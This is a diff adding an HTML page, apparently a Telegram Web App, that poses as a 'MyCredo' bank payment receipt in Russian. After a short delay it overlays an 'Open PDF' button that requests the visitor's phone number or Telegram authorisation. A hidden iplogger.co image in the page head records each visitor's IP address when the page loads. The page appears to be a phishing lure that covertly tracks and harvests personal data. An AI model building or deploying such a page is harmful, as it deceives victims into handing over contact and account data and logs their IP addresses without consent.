@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+        <img src="https://iplogger.co/16pc75">
+    <title>MyCredo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css">
+    <style>
+        body {
+            background-color: #f2f2f2;
+            color: #333;
+        }
+        .rounded-lg {
+            border-radius: 0.5rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container mx-auto p-4">
+        <img src="https://i.ibb.co/V2bNfxW/IMG-3413-20240710203726.png" alt="Логотип" class="mx-auto mb-4 w-full h-auto rounded-lg">
+        <div class="bg-white rounded-lg shadow p-6 relative">
+            <img id="paymentSlip" src="https://i.ibb.co/YffmwHX/Clean-Shot-2024-07-10-at-20-38-17-2x.png" alt="Платежный документ" class="mx-auto mb-4 w-full h-auto rounded-lg">
+            <div id="overlay" class="absolute inset-0 bg-white bg-opacity-90 flex items-center justify-center hidden rounded-lg">
+                <div class="bg-white rounded-lg shadow p-6 text-center">
+                    <p class="text-lg mb-4">Для просмотра квитанции в PDF нажмите кнопку ниже:</p>
+                    <button id="shareButton" class="bg-[#ea4c38] hover:bg-[#d13f31] text-red font-bold py-2 px-4 rounded-lg">
+                        Открыть PDF
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        Telegram.WebApp.ready();
+    
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(function() {
+                document.getElementById('overlay').classList.remove('hidden');
+            }, 2000);
+            
+            document.getElementById('shareButton').addEventListener('click', function() {
+                if (Telegram.WebApp.initDataUnsafe.user !== undefined) {
+                    // Пользователь авторизован, можно запросить номер телефона
+                    Telegram.WebApp.sendData('share_phone');
+                    Telegram.WebApp.MainButton.setText('Готово');
+                    Telegram.WebApp.MainButton.hide();
+                } else {
+                    // Пользователь не авторизован, нужно запросить авторизацию
+                    Telegram.WebApp.sendData('request_auth');
+                    Telegram.WebApp.MainButton.setText('Авторизоваться');
+                    Telegram.WebApp.MainButton.show();
+                }
+            });
+    
+            Telegram.WebApp.onEvent('mainButtonClicked', function() {
+                Telegram.WebApp.sendData('main_button_clicked');
+            });
+    
+            Telegram.WebApp.MainButton.setText('Войти');
+            Telegram.WebApp.MainButton.show();
+    
+            Telegram.WebApp.onEvent('phoneNumberShared', function(phoneNumber) {
+                // Обработка полученного номера телефона
+                alert('Номер телефона получен: ' + phoneNumber);
+                document.getElementById('overlay').classList.add('hidden');
+            });
+        });
+    </script>
+</body>
+</html>
